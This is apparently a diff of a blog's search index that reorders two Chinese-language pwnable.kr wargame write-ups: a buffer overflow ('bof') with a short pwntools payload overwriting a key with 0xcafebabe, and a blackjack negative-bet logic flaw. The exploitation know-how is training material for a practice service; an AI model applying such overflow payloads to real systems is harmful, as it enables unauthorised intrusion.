@@ -85,23 +85,6 @@
       </tags>
   </entry>
   <entry>
-    <title>bof</title>
-    <url>/xiaohong404.github.io/2020/10/15/bof/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/4.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/1.png" class></strong></p>
-<h3 id="查看给出的c语言源代码"><a href="#查看给出的c语言源代码" class="headerlink" title="查看给出的c语言源代码"></a>查看给出的c语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/2.png" class></strong></p>
-<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
-<h3 id="IDA32打开文件"><a href="#IDA32打开文件" class="headerlink" title="IDA32打开文件"></a>IDA32打开文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/3.png" class></strong></p>
-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>Pwnable.kr</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>blackjack</title>
     <url>/xiaohong404.github.io/2020/10/19/blackjack/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/19/blackjack/0.png" class></strong></p>
@@ -115,6 +98,23 @@
 <p><strong><img src="/xiaohong404.github.io/2020/10/19/blackjack/3.png" class></strong></p>
 <p>如果用户输了，则会扣除用户下注的金额，这里使用简单的减法操作，结合前面下注金额可以为负数，则直接输入一个很大的负数，之后故意输掉比赛，使得金额超过阈值拿到flag。</p>
 <h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/19/blackjack/4.png" class></strong></p>
+]]></content>
+      <tags>
+        <tag>Pwnable.kr</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bof</title>
+    <url>/xiaohong404.github.io/2020/10/15/bof/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/4.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/1.png" class></strong></p>
+<h3 id="查看给出的c语言源代码"><a href="#查看给出的c语言源代码" class="headerlink" title="查看给出的c语言源代码"></a>查看给出的c语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/2.png" class></strong></p>
+<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
+<h3 id="IDA32打开文件"><a href="#IDA32打开文件" class="headerlink" title="IDA32打开文件"></a>IDA32打开文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/3.png" class></strong></p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
         <tag>Pwnable.kr</tag>
